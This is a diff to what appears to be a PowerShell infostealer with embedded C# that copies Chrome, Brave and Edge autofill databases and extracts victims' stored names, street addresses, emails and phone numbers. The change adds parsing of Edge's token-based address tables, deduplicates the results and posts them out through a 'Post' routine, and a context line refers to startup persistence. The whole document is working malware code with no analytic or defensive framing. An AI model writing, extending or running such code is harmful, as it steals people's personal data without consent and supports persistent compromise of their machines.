@@ -684,31 +684,36 @@ public class AddrGrab {
     [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_column_bytes(IntPtr stmt, int c);
     static string T(IntPtr p, int n) { if (p == IntPtr.Zero || n <= 0) return ""; byte[] b = new byte[n]; Marshal.Copy(p, b, 0, n); return Encoding.UTF8.GetString(b); }
     static byte[] E(string s) { return Encoding.UTF8.GetBytes(s); }
-    public static List<string[]> Flat(string db) {
+
+    // Edge: token-based address book (guid, type, value)
+    public static List<string[]> Tokens(string db) {
         var rows = new List<string[]>();
         IntPtr hdb, stmt;
         if (sqlite3_open(E(db), out hdb) != 0) return rows;
-        if (sqlite3_prepare_v2(hdb, E("SELECT name,value FROM autofill"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
+        if (sqlite3_prepare_v2(hdb, E("SELECT guid,type,value FROM address_type_tokens UNION ALL SELECT guid,type,value FROM edge_server_addresses_type_tokens"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
         while (sqlite3_step(stmt) == 100) {
-            string n = T(sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
-            string v = T(sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
-            rows.Add(new string[] { n, v });
+            string g = T(sqlite3_column_text(stmt,0), sqlite3_column_bytes(stmt,0));
+            string ty = T(sqlite3_column_text(stmt,1), sqlite3_column_bytes(stmt,1));
+            string v = T(sqlite3_column_text(stmt,2), sqlite3_column_bytes(stmt,2));
+            rows.Add(new string[] { g, ty, v });
         }
         sqlite3_finalize(stmt); sqlite3_close(hdb);
         return rows;
     }
+
+    // Chrome/Brave: standard autofill_profiles
     public static List<string[]> Profiles(string db) {
         var rows = new List<string[]>();
         IntPtr hdb, stmt;
         if (sqlite3_open(E(db), out hdb) != 0) return rows;
         if (sqlite3_prepare_v2(hdb, E("SELECT p.street_address,p.city,p.state,p.zipcode,p.country_code,n.full_name FROM autofill_profiles p LEFT JOIN autofill_profile_names n ON n.guid=p.guid"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
         while (sqlite3_step(stmt) == 100) {
-            string street = T(sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
-            string city = T(sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
-            string state = T(sqlite3_column_text(stmt, 2), sqlite3_column_bytes(stmt, 2));
-            string zip = T(sqlite3_column_text(stmt, 3), sqlite3_column_bytes(stmt, 3));
-            string country = T(sqlite3_column_text(stmt, 4), sqlite3_column_bytes(stmt, 4));
-            string name = T(sqlite3_column_text(stmt, 5), sqlite3_column_bytes(stmt, 5));
+            string street = T(sqlite3_column_text(stmt,0), sqlite3_column_bytes(stmt,0));
+            string city = T(sqlite3_column_text(stmt,1), sqlite3_column_bytes(stmt,1));
+            string state = T(sqlite3_column_text(stmt,2), sqlite3_column_bytes(stmt,2));
+            string zip = T(sqlite3_column_text(stmt,3), sqlite3_column_bytes(stmt,3));
+            string country = T(sqlite3_column_text(stmt,4), sqlite3_column_bytes(stmt,4));
+            string name = T(sqlite3_column_text(stmt,5), sqlite3_column_bytes(stmt,5));
             rows.Add(new string[] { name, street, city, state, zip, country });
         }
         sqlite3_finalize(stmt); sqlite3_close(hdb);
@@ -717,6 +722,7 @@ public class AddrGrab {
 }
 '@
   }
+  $map = @{ 3='first';4='middle';5='last';7='fullname';9='email';14='phone';30='line1';31='line2';32='apt';33='city';34='state';35='zip';36='country';60='line1';77='street' }
   $hits = New-Object System.Collections.ArrayList
   $targets = @(
     @{ n = 'Chrome'; b = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
@@ -728,29 +734,40 @@ public class AddrGrab {
     if (-not (Test-Path $wd)) { continue }
     $tmp = Join-Path $env:TEMP ('wd_' + [Guid]::NewGuid().ToString('N') + '.db')
     Copy-Item $wd $tmp -Force -EA SilentlyContinue
-    # standard profiles (Chrome/Brave): full address
-    foreach ($r in [AddrGrab]::Profiles($tmp)) {
-      if (($r -join '') -ne '') { [void]$hits.Add(($t.n + '|' + ($r -join '|'))) }
+    # Edge token-based addresses (full street/city/state/zip)
+    $profiles = @{}
+    foreach ($r in [AddrGrab]::Tokens($tmp)) {
+      $type = 0
+      [void][int]::TryParse($r[1], [ref]$type)
+      $fname = $map[$type]
+      if (-not $fname -or -not $r[2]) { continue }
+      $r[2] = ($r[2] -replace '[\r\n]+', ' ').Trim()
+      $g = $r[0]
+      if (-not $profiles[$g]) { $profiles[$g] = @{} }
+      if (-not $profiles[$g][$fname]) { $profiles[$g][$fname] = $r[2] }
     }
-    # flat autofill (Edge + old): name/email/phone/postal/country
-    $first=''; $last=''; $email=''; $phone=''; $postal=''
-    foreach ($r in [AddrGrab]::Flat($tmp)) {
-      switch ($r[0]) {
-        'FirstName' { $first = $r[1] }
-        'LastName'  { $last  = $r[1] }
-        'Email'     { $email = $r[1] }
-        'Phone'     { $phone = $r[1] }
-      }
-      if ($r[0] -like ':r3:*') { $postal = $r[1] }
+    foreach ($g in ($profiles.Keys | Sort-Object)) {
+      $pp = $profiles[$g]
+      $street = $pp['street']; if (-not $street) { $street = $pp['line1'] }
+      $name = $pp['fullname']; if (-not $name) { $name = (($pp['first'] + ' ' + $pp['last']).Trim()) }
+      $parts = @("name=$name","street=$street","apt=$($pp['apt'])","city=$($pp['city'])","state=$($pp['state'])","zip=$($pp['zip'])","country=$($pp['country'])","email=$($pp['email'])","phone=$($pp['phone'])")
+      [void]$hits.Add(($t.n + '|' + ($parts -join '|')))
+    }
+    # Chrome/Brave standard profiles
+    foreach ($r in [AddrGrab]::Profiles($tmp)) {
+      if (($r -join '') -ne '') { [void]$hits.Add(($t.n + '|name=' + $r[0] + '|street=' + $r[1] + '|city=' + $r[2] + '|state=' + $r[3] + '|zip=' + $r[4] + '|country=' + $r[5])) }
     }
     Remove-Item $tmp -Force -EA SilentlyContinue
-    $line = @($first, $last, $email, $phone, $postal)
-    if (($line -ne $null -and ($line | Where-Object { $_ }) -join '') -ne '') {
-      [void]$hits.Add(($t.n + '|name=' + ($first + ' ' + $last).Trim() + '|email=' + $email + '|phone=' + $phone + '|postal=' + $postal))
-    }
   }
   if ($hits.Count -eq 0) { Post '[addresses] none'; return }
-  Post ("`[addresses] " + $hits.Count + '`' + "`n" + (($hits -join "`n")))
+  $seen = @{}
+  $out = New-Object System.Collections.ArrayList
+  foreach ($h in $hits) {
+    $key = ($h -split '\|' | Where-Object { $_ -match '^(street|city|zip)=' }) -join '|'
+    $kl = $key.ToLower()
+    if (-not $seen[$kl]) { $seen[$kl] = $true; [void]$out.Add($h) }
+  }
+  Post ("`[addresses] " + $out.Count + '`' + "`n" + (($out -join "`n")))
 }
 
 # ---- startup: persist + boot notify ----
